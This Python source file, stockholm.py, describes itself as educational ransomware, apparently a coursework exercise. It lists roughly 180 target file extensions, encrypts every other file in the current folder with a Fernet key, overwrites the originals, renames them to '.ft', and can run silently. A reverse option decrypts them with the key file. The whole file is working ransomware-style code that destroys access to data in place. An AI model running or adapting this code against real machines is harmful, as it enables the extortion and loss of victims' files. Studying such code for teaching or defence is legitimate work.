import argparse
import os
import glob
import requests
from cryptography.fernet import Fernet

extensions = (
    '.jpg', '.rtf', '.doc', '.js', '.sch', '.3dm', '.jsp', '.sh', '.3ds', '.key',
    '.sldm', '.3g2', '.lay', '.sldm', '.3gp', '.lay6', '.sldx', '.7z', '.ldf', '.slk',
    '.accdb', '.m3u', '.sln', '.aes', '.m4u', '.snt', '.ai', '.max', '.sql', '.ARC',
    '.mdb', '.sqlite3', '.asc', '.mdf', '.sqlitedb', '.asf', '.mid', '.stc', '.asm',
    '.mkv', '.std', '.asp', '.mml', '.sti', '.avi', '.mov', '.stw', '.backup', '.mp3',
    '.suo', '.bak', '.mp4', '.svg', '.bat', '.mpeg', '.swf', '.bmp', '.mpg', '.sxc',
    '.brd', '.msg', '.sxd', '.bz2', '.myd', '.sxi', '.c', '.Myi', '.sxm', '.cgm',
    '.nef', '.sxw', '.class', '.odb', '.tar', '.cmd', '.odg', '.tbk', '.cpp', '.odp',
    '.tgz', '.crt', '.ods', '.tif', '.cs', '.odt', '.tiff', '.csr', '.onetoc2', '.txt',
    '.csv', '.ost', '.uop', '.db', '.otg', '.uot', '.dbf', '.otp', '.vb', '.dch',
    '.ots', '.vbs', '.der', '.ott', '.vcd', '.dif', '.p12', '.vdi', '.dip', '.PAQ',
    '.vmdk', '.djvu', '.pas', '.vmx', '.docb', '.pdf', '.vob', '.docm', '.pem', '.vsd',
    '.docx', '.pfx', '.vsdx', '.dot', '.php', '.wav', '.dotm', '.pl', '.wb2', '.dotx',
    '.png', '.wk1', '.dwg', '.pot', '.wks', '.edb', '.potm', '.wma', '.eml', '.potx',
    '.wmv', '.fla', '.ppam', '.xlc', '.flv', '.pps', '.xlm', '.frm', '.ppsm', '.xls',
    '.gif', '.ppsx', '.xlsb', '.gpg', '.ppt', '.xlsm', '.gz', '.pptm', '.xlsx', '.h',
    '.pptx', '.xlt', '.hwp', '.ps1', '.xltm', '.ibd', '.psd', '.xltx', '.iso', '.pst',
    '.xlw', '.jar', '.rar', '.zip', '.java', '.raw'
)

def args_parser() ->  argparse.Namespace:
    parser = argparse.ArgumentParser(description="The program stockholm.py is an educational-purpose ransomware program. It allows for the encryption and decryption of various files within this folder.")
    parser.add_argument("-r", "--reverse", help="to reverse the infection", type=str, )
    parser.add_argument("-v", "--version", help="version of the programe", action="store_true")
    parser.add_argument("-s", "--silent", help="the program will not produce any output", action="store_true")

    args = parser.parse_args()
    return args

def encrypt(allfiles, args):
    # Recuperer la cle de chiffrement
    with open("key.key", mode='rb') as filekey:
        key = filekey.read()
    for file in allfiles:
        # Recuperer le contenu du fichier a chiffrer
        with open(file, mode='rb') as fileRead:
            content = fileRead.read()
        # Chiffrer le contenu du fichier
        fernet = Fernet(key)
        encrypt_data = fernet.encrypt(content)
        # Reecrire le contenu chiffrer dans le fichier
        if args.silent == False:
            print("encrypt:", file)
        with open(file, mode='wb') as fileWrite:
            fileWrite.write(encrypt_data)
        # Changer le nom du fichier
        filename = os.path.splitext(file)[0]
        if '.ft' not in file:
            os.rename(file, filename + '.ft')

def decrypt(keyfile):
    # Ouvrir le fichier de la key
    with open(keyfile, mode='rb') as decryptfile:
        key = decryptfile.read()
    # Ouvrir les fichier un par un
    for file in os.listdir():
        # Si l'extension est .ft il faut le dechiffrer
        if os.path.splitext(file)[1] == '.ft':
            # Ouvrir le fichier a dechiffrer et recuperer le contenu
            with open(file, mode='rb') as fileRead:
                content = fileRead.read()
            # Dechiffrer grace a la key
            fernet = Fernet(key)
            decrypt_data = fernet.decrypt(content)
            # Ecrire les donnees dechiffrer
            with open(file, mode='wb') as fileWrite:
                fileWrite.write(decrypt_data)

def main():
    args = args_parser()
    if args.version:
        print("version: 1.1")
    elif args.reverse:
        try:
            decrypt(keyfile=args.reverse)
        except Exception as e:
            print(e)
    else:
        try:
            allfiles = []
            for file in os.listdir():
                if file != "stockholm.py" and file != "Makefile" and file != "README.md" and file != "key.py" and file != "key.key" and file != "create_files.py" and '.ft' not in file:
                    allfiles.append(file)
            encrypt(allfiles=allfiles, args=args)
        except Exception as e:
            print(e)

if __name__ == '__main__':
    main()